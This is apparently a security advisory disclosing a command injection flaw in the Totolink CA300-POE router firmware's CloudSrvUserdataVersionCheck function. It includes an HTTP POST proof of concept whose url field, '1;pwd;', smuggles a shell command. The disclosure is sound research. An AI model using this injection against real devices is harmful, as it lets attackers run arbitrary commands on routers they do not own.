## Totolink CA300-POE command injection

### Overview

* Vendor: TOTOLINK

* Product: Totolink CA300-POE
* Version: V6.2c.884_B20180522

* Manufacturer's address：https://www.totolink.net/
* Firmware download address ：https://totolink.id/data/upload/20181119/ba6d1ef945396a396fb70094a66d5e81.zip

### Vulnerability details

Totolink CA300-POE V6.2c.884_B20180522 was found to contain a command injection vulnerability in the `CloudSrvUserdataVersionCheck` function via the `url` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

![image](./img/1.png)

#### PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 132
Origin: http://192.168.0.254
Connection: close
Referer: http://192.168.0.254
Cookie: SESSION_ID=2:1801026000:2

{
    "topicurl": "CloudSrvUserdataVersionCheck",
    "mode": "1",
    "url": "1;pwd;"
}
```

